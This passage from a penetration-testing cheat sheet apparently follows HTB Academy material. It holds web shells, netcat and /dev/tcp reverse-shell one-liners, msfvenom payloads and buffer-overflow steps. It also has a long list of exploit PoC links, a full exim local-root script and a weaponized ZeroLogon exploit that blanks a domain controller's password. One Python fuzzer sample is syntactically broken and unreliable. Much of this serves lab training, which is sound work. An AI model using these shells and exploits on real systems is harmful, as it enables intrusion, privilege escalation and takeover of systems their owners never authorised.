searchsploit openssh 7.2
msfconsole -q
```

### Shells and Stabilization

```bash
# Listener
nc -lvnp 1234

# Upgrade a basic shell to a PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z, then:
stty raw -echo; fg
export TERM=xterm
stty rows 40 cols 120
```

Web shell examples:

```php
<?php system($_REQUEST["cmd"]); ?>
```

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

```aspx
<% eval request("cmd") %>
```

### Privilege Escalation and File Transfer

```bash
./linpeas.sh
sudo -l
sudo -u <USER> /bin/echo Hello World!

# SSH key reuse
chmod 600 id_rsa
ssh root@<TARGET_IP> -i id_rsa

# Serve files from the attack host
python3 -m http.server 8000

# Transfer with SCP
scp linenum.sh <USER>@<TARGET_IP>:/tmp/linenum.sh
```

### Nibbles Walkthrough

A compact example of the full workflow. Replace `<TARGET_IP>` and redacted secrets.

```bash
# Enumeration
nmap -sV --open -oA nibbles_initial_scan <TARGET_IP>
nmap -sC -p 22,80 -oA nibbles_script_scan <TARGET_IP>
nmap -sV --script=http-enum -oA nibbles_nmap_http_enum <TARGET_IP>

# Web footprinting
whatweb http://<TARGET_IP>
curl http://<TARGET_IP>
gobuster dir -u http://<TARGET_IP>/nibbleblog/ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt
curl -s http://<TARGET_IP>/nibbleblog/README
curl -s http://<TARGET_IP>/nibbleblog/content/private/users.xml | xmllint --format -
curl -s http://<TARGET_IP>/nibbleblog/content/private/config.xml | xmllint --format -
```

The admin credentials are found during enumeration; use them only in the lab. After uploading a PHP plugin shell:

```bash
curl http://<TARGET_IP>/nibbleblog/content/private/plugins/my_image/image.php
```

Privilege escalation via a writable monitor script:

```bash
unzip personal.zip
cat monitor.sh
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 8443 >/tmp/f' | tee -a monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh
```

Metasploit alternative:

```text
msf6 > search nibbleblog
msf6 > use 0
msf6 > set rhosts <TARGET_IP>
msf6 > set lhost <ATTACKER_IP>
msf6 > set username admin
msf6 > set password <PASSWORD>
msf6 > set targeturi nibbleblog
msf6 > set payload generic/shell_reverse_tcp
msf6 > exploit
```

### Common Pitfalls

```bash
# VPN not connecting
sudo openvpn ./htb.ovpn
ip -4 a show tun0
ping -c 4 10.10.14.1

# Regenerate missing SSH keys
ssh-keygen
```

- Re-scan after changes; services and versions may differ from the first scan.
- Stabilize shells before running interactive tools.
- Keep a log of every command and result for the report.

## 16. Vulnerability Assessment

> Condensed from HTB Academy **Vulnerability Assessment** (module 108).

### Assessment Types

- **Vulnerability assessment** — identify and rank weaknesses; no exploitation.
- **Penetration test** — validate impact through controlled exploitation.
- **Compliance/audit** — measure against a standard or framework.
- **Standards** — PTES, OWASP WSTG, NIST, CIS, ISO 27001, PCI DSS.

### Scoring and References

- **CVSS** — base, temporal, and environmental scores; use the vector string in reports.
- **CVE** — public identifier for a specific vulnerability.
- **CWE** — weakness class; useful for root-cause and remediation guidance.
- Validate scanner findings manually; scanners produce false positives and false negatives.

### Nessus

```bash
# Install and start the daemon
sudo dpkg -i Nessus-<VERSION>-ubuntu910_amd64.deb
sudo systemctl start nessusd.service

# Open the web UI (default https://<SCANNER_IP>:8834), then create a scan
```

Useful scan profiles: basic network scan, credentialed patch audit, web application tests, malware scan. Review false positives and export results.

```bash
# Example export helper
./nessus_downloader.rb

# SSL/TLS checks
sslscan example.com

# Interface/bandwidth checks during large scans
sudo apt install vnstat
sudo vnstat -l -i <INTERFACE>
```

### OpenVAS / GVM

```bash
sudo apt-get update && sudo apt-get -y full-upgrade
sudo apt-get install gvm && openvas
sudo gvm-setup
sudo gvm-start

# Export a report to XLSX
python3 -m openvasreporting -i report-<ID>.xml -f xlsx
```

### Nessus Advanced Settings & Export

- Use credentialed scans where authorized (SSH/SMB/Windows credentials) to improve accuracy.
- Tune plugin families, port ranges, and performance to avoid disruptions.
- Review false positives and validate critical findings manually.
- Export formats: `.nessus`, CSV, HTML, PDF; use `nessus_downloader.rb` for automation.
- Compare scans over time to track remediation.
- Store reports and evidence according to the engagement's retention policy.

### Reporting

- Executive summary: scope, approach, risk posture, top findings.
- Technical findings: description, affected asset, evidence, CVSS, remediation.
- Include positive controls and retest guidance.
- Store evidence and reports according to the engagement's data-retention terms.

### Vulnerability Analysis Resources

| nikto | https://github.com/sullo/nikto |
| Sparta | https://github.com/SECFORCE/sparta |

### Exploit Databases

| Database | URL |
| 0day.today Exploit Database | https://0day.today |
| Exploit Database | https://www.exploit-db.com |
| Packet Storm | https://packetstormsecurity.com |
| Sploitus | https://sploitus.com |

### CVE References

| CVE | Descritpion | URL |
| --- | --- | --- |
| CVE-2014-6271 | Shocker RCE | https://github.com/nccgroup/shocker |
| CVE-2014-6271 | Shellshock RCE PoC | https://github.com/zalalov/CVE-2014-6271 |
| CVE-2014-6271 | Shellshocker RCE POCs | https://github.com/mubix/shellshocker-pocs |
| CVE-2016-5195 | Dirty COW LPE | https://github.com/firefart/dirtycow |
| CVE-2016-5195 | Dirty COW '/proc/self/mem' Race Condition (/etc/passwd Method) LPE | https://www.exploit-db.com/exploits/40847 |
| CVE-2016-5195 | Dirty COW 'PTRACE_POKEDATA' Race Condition (/etc/passwd Method) LPE | https://www.exploit-db.com/exploits/40839 |
| CVE-2017-0144 | EternalBlue (MS17-010) RCE | https://github.com/d4t4s3c/Win7Blue |
| CVE-2017-0199 | RTF Dynamite RCE | https://github.com/bhdresh/CVE-2017-0199 |
| CVE-2018-7600 | Drupalgeddon 2 RCE | https://github.com/g0rx/CVE-2018-7600-Drupal-RCE |
| CVE-2018-10933 | libSSH Authentication Bypass | https://github.com/blacknbunny/CVE-2018-10933 |
| CVE-2018-16509 | Ghostscript PIL RCE | https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509 |
| CVE-2019-14287 | Sudo Bypass LPE | https://github.com/n0w4n/CVE-2019-14287 |
| CVE-2019-18634 | Sudo Buffer Overflow LPE | https://github.com/saleemrashid/sudo-cve-2019-18634 |
| CVE-2019-5736 | RunC Container Escape PoC | https://github.com/Frichetten/CVE-2019-5736-PoC |
| CVE-2019-6447 | ES File Explorer Open Port Arbitrary File Read | https://github.com/fs0c131y/ESFileExplorerOpenPortVuln |
| CVE-2019-7304 | dirty_sock LPE | https://github.com/initstring/dirty_sock |
| CVE-2020-0796 | SMBGhost RCE PoC | https://github.com/chompie1337/SMBGhost_RCE_PoC |
| CVE-2020-1472 | ZeroLogon PE Checker & Exploitation Code | https://github.com/VoidSec/CVE-2020-1472 |
| CVE-2020-1472 | ZeroLogon PE Exploitation Script | https://github.com/risksense/zerologon |
| CVE-2020-1472 | ZeroLogon PE PoC | https://github.com/dirkjanm/CVE-2020-1472 |
| CVE-2020-1472 | ZeroLogon PE Testing Script | https://github.com/SecuraBV/CVE-2020-1472 |
| CVE-2021-1675,CVE-2021-34527 | PrintNightmare LPE RCE | https://github.com/nemo-wq/PrintNightmare-CVE-2021-34527 |
| CVE-2021-1675 | PrintNightmare LPE RCE (PowerShell Implementation) | https://github.com/calebstewart/CVE-2021-1675 |
| CVE-2021-21972 | vCenter RCE | https://github.com/horizon3ai/CVE-2021-21972 |
| CVE-2021-22204 | ExifTool Command Injection RCE | https://github.com/AssassinUKG/CVE-2021-22204 |
| CVE-2021-22204 | GitLab ExifTool RCE | https://github.com/CsEnox/Gitlab-Exiftool-RCE |
| CVE-2021-22204 | GitLab ExifTool RCE (Python Implementation) | https://github.com/convisolabs/CVE-2021-22204-exiftool |
| CVE-2021-26085 | Confluence Server RCE | https://github.com/Phuong39/CVE-2021-26085 |
| CVE-2021-27928 | MariaDB/MySQL wsrep provider RCE | https://github.com/Al1ex/CVE-2021-27928 |
| CVE-2021-3129 | Laravel Framework RCE | https://github.com/nth347/CVE-2021-3129_exploit |
| CVE-2021-3156 | Sudo / sudoedit LPE  | https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit |
| CVE-2021-3156 | Sudo / sudoedit LPE PoC | https://github.com/blasty/CVE-2021-3156 |
| CVE-2021-3493 | OverlayFS Ubuntu Kernel Exploit LPE | https://github.com/briskets/CVE-2021-3493 |
| CVE-2021-3560 | polkit LPE (C Implementation) | https://github.com/hakivvi/CVE-2021-3560 |
| CVE-2021-3560 | polkit LPE | https://github.com/Almorabea/Polkit-exploit |
| CVE-2021-3560 | polkit LPE PoC | https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation |
| CVE-2021-36934 | HiveNightmare LPE | https://github.com/GossiTheDog/HiveNightmare |
| CVE-2021-36942 | PetitPotam | https://github.com/topotam/PetitPotam |
| CVE-2021-36942 | DFSCoerce | https://github.com/Wh04m1001/DFSCoerce |
| CVE-2021-4034 | PwnKit Pkexec Self-contained Exploit LPE | https://github.com/ly4k/PwnKit |
| CVE-2021-4034 | PwnKit Pkexec LPE PoC (1) | https://github.com/dzonerzy/poc-cve-2021-4034 |
| CVE-2021-4034 | PwnKit Pkexec LPE PoC (2) | https://github.com/arthepsy/CVE-2021-4034 |
| CVE-2021-4034 | PwnKit Pkexec LPE PoC (3) | https://github.com/nikaiw/CVE-2021-4034 |
| CVE-2021-41379 | InstallerFileTakeOver LPE (0-day) (Archive) | https://github.com/klinix5/InstallerFileTakeOver |
| CVE-2021-41379 | InstallerFileTakeOver LPE (0-day) (Fork) | https://github.com/waltlin/CVE-2021-41379-With-Public-Exploit-Lets-You-Become-An-Admin-InstallerFileTakeOver |
| CVE-2021-41773,CVE-2021-42013, CVE-2020-17519 | Simples Apache Path Traversal (0-day) | https://github.com/MrCl0wnLab/SimplesApachePathTraversal |
| CVE-2021-42278,CVE-2021-42287 | sam-the-admin, sAMAccountName Spoofing / Domain Admin Impersonation PE | https://github.com/WazeHell/sam-the-admin |
| CVE-2021-42278 | sam-the-admin, sAMAccountName Spoofing / Domain Admin Impersonation PE (Python Implementation) | https://github.com/ly4k/Pachine |
| CVE-2021-42287,CVE-2021-42278 | noPac LPE (1) | https://github.com/cube0x0/noPac |
| CVE-2021-42287,CVE-2021-42278 | noPac LPE (2) | https://github.com/Ridter/noPac |
| CVE-2021-42321 | Microsoft Exchange Server RCE | https://gist.github.com/testanull/<NTLM_HASH> |
| CVE-2021-44228 | Log4Shell RCE (0-day) | https://github.com/kozmer/log4j-shell-poc |
| CVE-2021-44228 | Log4Shell RCE (0-day) | https://github.com/welk1n/JNDI-Injection-Exploit |
| CVE-2022-0847 | DirtyPipe-Exploit LPE | https://github.com/n3rada/DirtyPipe |
| CVE-2022-0847 | DirtyPipe-Exploits LPE | https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits |
| CVE-2022-21999 | SpoolFool, Windows Print Spooler LPE | https://github.com/ly4k/SpoolFool |
| CVE-2022-22963 | Spring4Shell RCE (0-day) | https://github.com/tweedge/springcore-0day-en |
| CVE-2022-23119,CVE-2022-23120 | Trend Micro Deep Security Agent for Linux Arbitrary File Read | https://github.com/modzero/MZ-21-02-Trendmicro |
| CVE-2022-24715 | Icinga Web 2 Authenticated Remote Code Execution RCE | https://github.com/JacobEbben/CVE-2022-24715 |
| CVE-2022-26134 | ConfluentPwn RCE (0-day) | https://github.com/redhuntlabs/ConfluentPwn |
| CVE-2022-31214 | Firejail / Firejoin LPE | https://seclists.org/oss-sec/2022/q2/188 |
| CVE-2022-31214 | Firejail / Firejoin LPE | https://www.openwall.com/lists/oss-security/2022/06/08/10 |
| CVE-2022-34918 | Netfilter Kernel Exploit LPE | https://github.com/randorisec/CVE-2022-34918-LPE-PoC |
| CVE-2022-46169 | Cacti Authentication Bypass RCE | https://github.com/ariyaadinatha/cacti-cve-2022-46169-exploit |
| CVE-2023-20598 | PDFWKRNL Kernel Driver LPE | https://github.com/H4rk3nz0/CVE-2023-20598-PDFWKRNL |
| CVE-2023-21746 | Windows NTLM EoP LocalPotato LPE | https://github.com/decoder-it/LocalPotato |
| CVE-2023-21768 | Windows Ancillary Function Driver for WinSock LPE POC | https://github.com/chompie1337/Windows_LPE_AFD_CVE-2023-21768 |
| CVE-2023-21817 | Kerberos Unlock LPE PoC | https://gist.github.com/monoxgas/<NTLM_HASH> |
| CVE-2023-22809 | sudoedit LPE | https://github.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc |
| CVE-2023-23752 | Joomla Unauthenticated Information Disclosure | https://github.com/Acceis/exploit-CVE-2023-23752 |
| CVE-2023-25690 | Apache mod_proxy HTTP Request Smuggling PoC | https://github.com/dhmosfunk/CVE-2023-25690-POC |
| CVE-2023-28879 | Shell in the Ghost: Ghostscript RCE PoC | https://github.com/AlmondOffSec/PoCs/tree/master/Ghostscript_rce |
| CVE-2023-32233 | Use-After-Free in Netfilter nf_tables LPE | https://github.com/Liuk3r/CVE-2023-32233 |
| CVE-2023-32629, CVE-2023-2640 | GameOverlay Ubuntu Kernel Exploit LPE (0-day) | https://twitter.com/liadeliyahu/status/1684841527959273472?s=09 |
| CVE-2023-36874 | Windows Error Reporting Service LPE (0-day) | https://github.com/Wh04m1001/CVE-2023-36874 |
| CVE-2023-51467, CVE-2023-49070 | Apache OFBiz Authentication Bypass | https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass |
| CVE-2023-7028 | GitLab Account Takeover | https://github.com/V1lu0/CVE-2023-7028 |
| CVE-2023-7028 | GitLab Account Takeover | https://github.com/Vozec/CVE-2023-7028 |
| CVE-2024-0582 | Ubuntu Linux Kernel io_uring LPE | https://github.com/ysanatomic/io_uring_LPE-CVE-2024-0582 |
| CVE-2024-1086 | Use-After-Free Linux Kernel Netfilter nf_tables LPE | https://github.com/Notselwyn/CVE-2024-1086 |
| CVE-2024-4577 | PHP-CGI Argument Injection Vulnerability RCE | https://github.com/watchtowrlabs/CVE-2024-4577 |
| CVE-2024-30088 | Microsoft Windows LPE | https://github.com/tykawaii98/CVE-2024-30088 |
| CVE-2024-49138 | Windows Common Log File System Driver LPE | https://github.com/MrAle98/CVE-2024-49138-POC |
| CVE-2025-14847 | MongoBleed MongoDB Unauthenticated Memory Leak Exploit RCE | https://github.com/joe-desimone/mongobleed |
| CVE-2025-24071 | Windows File Explorer Spoofing Vulnerability (1) | https://github.com/ThemeHackers/CVE-2025-24071 |
| CVE-2025-24071 | Windows File Explorer Spoofing Vulnerability (2) | https://github.com/0x6rss/CVE-2025-24071_PoC |
| CVE-2025-24813 | Apache Tomcat Deserialization RCE (1) | https://github.com/iSee857/CVE-2025-24813-PoC |
| CVE-2025-24813 | Apache Tomcat Deserialization RCE (2) | https://github.com/absholi7ly/POC-CVE-2025-24813 |
| CVE-2025-29927 | Next.js Authentication Bypass | https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware |
| CVE-2025-30397 | Windows Server 2025 Use-After-Free in JScript.dll (RCE) | https://github.com/mbanyamer/CVE-2025-30397---Windows-Server-2025-JScript-RCE-Use-After-Free- |
| CVE-2025-32463 | chwoot sudo LPE | https://github.com/pr0v3rbs/CVE-2025-32463_chwoot |
| CVE-2025-55182 | React2Shell RCE | https://github.com/msanft/CVE-2025-55182 |
| CVE-2025-62215 | Windows Kernel LPE | https://github.com/dexterm300/CVE-2025-62215-exploit-poc |
| CVE-2025-9074 | Docker Desktop (Windows) Container Escape - Host Write via Exposed Engine API | https://github.com/zenzue/CVE-2025-9074 |
| CVE-2026-24061 | GNU Inetutils telnetd RCE | https://github.com/SafeBreach-Labs/CVE-2026-24061 |
| CVE-2026-26128 | Windows SMB Server Improper Authentication LPE | https://github.com/jarnovandenbrink/CVE-2026-26128 |
| CVE-2026-27912 | ResetNightmare LPE | https://github.com/Semperis-Community/ResetNightmare |
| CVE-2026-31431 | Copy Fail LPE (1) | https://github.com/theori-io/copy-fail-CVE-2026-31431 |
| CVE-2026-31431 | Copy Fail LPE (2) | https://github.com/painoob/Copy-Fail-Exploit-CVE-2026-31431 |
| CVE-2026-31635 | DirtyDecrypt / DirtyCBC LPE | https://github.com/v12-security/pocs/tree/main/dirtydecrypt |
| CVE-2026-41096 | Windows DNS Client RCE | https://github.com/satchfunky/CVE-2026-41096-POC |
| CVE-2026-41651 | Pack2TheRoot LPE (1) | https://github.com/Vozec/CVE-2026-41651 |
| CVE-2026-41651 | Pack2TheRoot LPE (2) | https://github.com/shibaaa204/Pack2TheRoot |
| CVE-2026-42945 | NGINX Rift RCE | https://github.com/DepthFirstDisclosures/Nginx-Rift |
| CVE-2026-46300 | Fragnesia Universal Linux LPE | https://github.com/v12-security/pocs/blob/main/fragnesia%2FREADME.md |
| CVE-2026-54121 | Certighost | https://github.com/aniqfakhrul/CVE-2026-54121 |
| CVE-2026-63030, CVE-2026-6013 | wp2shell RCE | https://github.com/Icex0/wp2shell-poc |
| CVE-2026-85706 | GitLab Unauthenticated Arbitrary File Read | https://github.com/guneykabel/cve-2026-85706 |
| CVE-2026-109618, CVE-2026-109619 |  php2shell RCE (1) | https://github.com/ikow/php2shell-poc |
| CVE-2026-109618, CVE-2026-109619 |  php2shell RCE (2) | https://github.com/JoasASantos/php2shell-exploit |
| CVE-2026-123007 | NGINX HTTP/2 Integer Underflow RCE | https://github.com/sfewer-r7/CVE-2026-123007 |
| CVE-2026-123158 | *sshole OpenSSH Password Authentication Bypass RCE | https://github.com/0xsyr0/CVE-2026-123158-POC |

#### Miscellaneous Exploits

| n/a | BadSuccessor LPE | https://github.com/ibaiC/BadSuccessor |
| n/a | BlueHammer LPE (1) | https://git.projectnightcrawler.dev/NightmareEclipse/BlueHammer |
| n/a | BlueHammer LPE (2) | https://github.com/0xjustBen/BlueHammer |
| n/a | Dirty Frag Universal Linux LPE | https://github.com/V4bel/dirtyfrag |
| n/a | MiniPlasma CVE-2020-17103 partially patched cldflt.sys LPE | https://git.projectnightcrawler.dev/NightmareEclipse/MiniPlasma |
| n/a | NoFilter LPE | https://github.com/deepinstinct/NoFilter |
| n/a | OfflineSAM LPE | https://github.com/gtworek/PSBits/tree/master/OfflineSAM |
| n/a | OfflineAddAdmin2 LPE | https://github.com/gtworek/PSBits/tree/master/OfflineSAM/OfflineAddAdmin2 |
| n/a | PrintSpoofer LPE (1) | https://github.com/dievus/printspoofer |
| n/a | PrintSpoofer LPE (2) | https://github.com/itm4n/PrintSpoofer |
| n/a | SharpSuccessor LPE | https://github.com/logangoins/SharpSuccessor |
| n/a | Shocker Container Escape | https://github.com/gabrtv/shocker |
| n/a | ssh-keysign-pwn | https://github.com/0xdeadbeefnetwork/ssh-keysign-pwn |
| n/a | StorSvc LPE | https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc |
| n/a | SystemNightmare LPE | https://github.com/GossiTheDog/SystemNightmare |

#### Vegetable Exploits

| n/a | ADCSCoercePotato LPE | https://github.com/decoder-it/ADCSCoercePotato |
| n/a | CoercedPotato LPE | https://github.com/Prepouce/CoercedPotato |
| n/a | CouchPotato LPE | https://github.com/aaron-kidwell/CouchPotato |
| n/a | DCOMPotato LPE | https://github.com/zcgonvh/DCOMPotato |
| n/a | DeadPotato LPE | https://github.com/lypd0/DeadPotato |
| n/a | GenericPotato LPE | https://github.com/micahvandeusen/GenericPotato |
| n/a | GodPotato LPE | https://github.com/BeichenDream/GodPotato |
| n/a | JuicyPotato LPE | https://github.com/ohpe/juicy-potato |
| n/a | Juice-PotatoNG LPE | https://github.com/antonioCoco/JuicyPotatoNG |
| n/a | MultiPotato LPE | https://github.com/S3cur3Th1sSh1t/MultiPotato |
| n/a | RemotePotato0 LPE | https://github.com/antonioCoco/RemotePotato0 |
| n/a | RoguePotato LPE | https://github.com/antonioCoco/RoguePotato |
| n/a | RottenPotatoNG LPE | https://github.com/breenmachine/RottenPotatoNG |
| n/a | RustPotato LPE | https://github.com/safedv/RustPotato |
| n/a | S4UTomato LPE | https://github.com/wh0amitz/S4UTomato |
| n/a | SharpEfsPotato LPE | https://github.com/bugch3ck/SharpEfsPotato |
| n/a | SigmaPotato LPE | https://github.com/tylerdotrar/SigmaPotato |
| n/a | SweetPotato LPE | https://github.com/CCob/SweetPotato |
| n/a | SweetPotato LPE | https://github.com/uknowsec/SweetPotato |

#### Exploit Collections

| n/a | bin-sploits | https://gitlab.com/exploit-database/exploitdb-bin-sploits |
| n/a | Kernelhub | https://github.com/Ascotbe/Kernelhub |
| n/a | Next.js v16.2.4 Exploit Collection | https://github.com/dwisiswant0/next-16.2.4-pocs |
| n/a | Pre-compiled Windows Exploits | https://github.com/abatchy17/WindowsExploits |
| n/a | Windows Exploits | https://github.com/SecWiki/windows-kernel-exploits |

### Buffer Overflow

```
# BASIC GUIDE
1. Send "A"*1024
2. Replace "A" with /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l LENGTH
3. When crash "!mona findmsp" (E10.11.1.111 offset) or ""/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q TEXT" or "!mona pattern_offset eip"
4. Confirm the location with "B" and "C"
5. Check for badchars instead CCCC (ESP):
badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10" "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20" "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30" "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40" "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50" "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60" "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70" "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80" "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90" "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0" "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0" "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0" "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0" "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0" "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0" "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
with script _badchars.py and
"!mona compare -a esp -f C:\Users\IEUser\Desktop\badchar_test.bin"
	5.1 AWESOME WAY TO CHECK BADCHARS (https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/):
		a. !mona config -set workingfolder c:\logs\%p
	    b. !mona bytearray -b "\x00\x0d"
	    c. Copy from c:\logs\%p\bytearray.txt to python exploit and run again
	    d. !mona compare -f C:\logs\%p\bytearray.bin -a 02F238D0 (ESP address)
	    e. In " data", before unicode chars it shows badchars.
 6. Find JMP ESP with "!mona modules" or "!mona jmp -r esp" or "!mona jmp -r esp -cpb '\x00\x0a\x0d'" find one with security modules "FALSE"

	6.1 Then, "!mona find -s "\xff\xe4" -m PROGRAM/DLL-FALSE"
	6.2 Remember put the JMP ESP location in reverse order due to endianness: 5F4A358F will be \x8f\x35\x4a\x5f

7. Generate shellcode and place it:
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.1.111 LPORT=4433 -f python –e x86/shikata_ga_nai -b "\x00"

msfvenom -p windows/shell_reverse_tcp lhost=10.11.1.111 lport=443 EXITFUNC=thread -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -f python -v shellcode

8. Final buffer like:
buffer="A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode
```

```
################ sample 1 ################################################
#!/usr/bin/python
import socket,sys

if len(sys.argv) != 3:
    print("usage: python fuzzer.py 10.11.1.111 PORT")
    exit(1)

payload = "A" * 1000

ipAddress = sys.argv[1]
port = int(sys.argv[2])

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ipAddress, port))
    s.recv(1024)
    print "Sending payload"
    s.send(payload)
    print "Done"
    s.close()
except:
    print "Error"
    sys.exit(0)

################ sample 2 ################################################
#!/usr/bin/python
import time, struct, sys
import socket as so

    server = sys.argv[1]
    port = 5555
except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()

req1 = "AUTH " + "\x41"*1072
s = so.socket(so.AF_INET, so.SOCK_STREAM)
     s.connect((server, port))
     print repr(s.recv(1024))
     s.send(req1)
     print "[!] connection refused, check debugger"
```

### Exploit Searching (SearchSploit)

Where there are many exploits for a software, use google. It will automatically sort it by popularity.

```bash
site:exploit-db.com apache 2.4.7

# Remove dos-exploits
searchsploit Apache 2.4.7 | grep -v '/dos/'
searchsploit Apache | grep -v '/dos/' | grep -vi "tomcat"

# Only search the title (exclude the path), add the -t
searchsploit -t Apache | grep -v '/dos/'
```

### CVE Exploits & PoCs

#### CVE-2014-6271: Shellshock RCE PoC

```shell
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' http://<RHOST>/cgi-bin/user.sh
```

#### CVE-2016-1531: exim LPE

- exim version <= 4.84-3

```bash
#!/bin/sh
# CVE-2016-1531 exim <= 4.84-3 local root exploit
# ===============================================
# you can write files as root or force a perl module to
# load by manipulating the perl environment and running
# exim with the "perl_startup" argument -ps.
#
# e.g.
# [fantastic@localhost tmp]$ ./cve-2016-1531.sh
# [ CVE-2016-1531 local root exploit
# sh-4.3# id
# uid=0(root) gid=1000(fantastic) groups=1000(fantastic)
#
# -- Hacker Fantastic
echo [ CVE-2016-1531 local root exploit
cat > /tmp/root.pm << EOF
package root;
use strict;
use warnings;

system("/bin/sh");
EOF
PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps
```

#### CVE-2019-14287: Sudo Bypass

> https://www.exploit-db.com/exploits/47502

##### Prerequisites

- Sudo version < 1.8.28

##### Exploitation

```shell
!root:
sudo -u#-1 /bin/bash
```

#### CVE-2020-1472: ZeroLogon PE

> https://github.com/SecuraBV/CVE-2020-1472

> https://github.com/dirkjanm/CVE-2020-1472

> https://raw.githubusercontent.com/SecuraBV/CVE-2020-1472/master/zerologon_tester.py

**Prerequisites**

```shell
python3 -m pip install virtualenv
source venv/bin/activate
pip install git+https://github.com/SecureAuthCorp/impacket
```

##### PoC Modification

```shell
    newPassRequest = nrpc.NetrServerPasswordSet2()
    newPassRequest['PrimaryName'] = dc_handle + '\x00'
    newPassRequest['AccountName'] = target_computer + '$\x00'
    newPassRequest['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
    auth = nrpc.NETLOGON_AUTHENTICATOR()
    auth['Credential'] = b'\x00' * 8
    auth['Timestamp'] = 0
    newPassRequest['Authenticator'] = auth
    newPassRequest['ComputerName'] = target_computer + '\x00'
    newPassRequest['ClearNewPassword'] =  b'\x00' * 516
    rpc_con.request(newPassRequest)
```

##### Weaponized PoC

```python
#!/usr/bin/env python3

from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import transport
from impacket import crypto

import hmac, hashlib, struct, sys, socket, time
from binascii import hexlify, unhexlify
from subprocess import check_call

# Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be necessary on average.
MAX_ATTEMPTS = 2000 # False negative chance: 0.04%

def fail(msg):
  print(msg, file=sys.stderr)
  print('This might have been caused by invalid arguments or network issues.', file=sys.stderr)
  sys.exit(2)

def try_zero_authenticate(dc_handle, dc_ip, target_computer):
  # Connect to the DC's Netlogon service.
  binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
  rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
  rpc_con.connect()
  rpc_con.bind(nrpc.MSRPC_UUID_NRPC)

  # Use an all-zero challenge and credential.
  plaintext = b'\x00' * 8
  ciphertext = b'\x00' * 8

  # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.
  flags = 0x212fffff

  # Send challenge and authentication request.
  nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
  try:
    server_auth = nrpc.hNetrServerAuthenticate3(
      rpc_con, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
      target_computer + '\x00', ciphertext, flags
    )


    # It worked!
    assert server_auth['ErrorCode'] == 0
    newPassRequest = nrpc.NetrServerPasswordSet2()
    newPassRequest['PrimaryName'] = dc_handle + '\x00'
    newPassRequest['AccountName'] = target_computer + '$\x00'
    newPassRequest['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
    auth = nrpc.NETLOGON_AUTHENTICATOR()
    auth['Credential'] = b'\x00' * 8
    auth['Timestamp'] = 0
    newPassRequest['Authenticator'] = auth
    newPassRequest['ComputerName'] = target_computer + '\x00'
    newPassRequest['ClearNewPassword'] =  b'\x00' * 516
    rpc_con.request(newPassRequest)
    return rpc_con

  except nrpc.DCERPCSessionError as ex:
